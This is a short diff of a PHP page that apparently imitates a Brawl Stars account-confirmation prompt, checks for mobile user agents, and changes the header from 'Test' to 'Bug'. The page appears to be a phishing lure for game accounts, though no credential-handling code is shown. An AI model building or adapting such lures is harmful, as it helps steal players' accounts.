@@ -69,7 +69,7 @@ if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
 
   <div class="form_item">
     <div class="login_header">
-     Тест Brawl - Stars 
+     Баг Brawl - Stars 
      Пожалуйста подтвердите ваш аккаунт.
     </div>
       <div class="fi_row"><div class="service_msg_box">
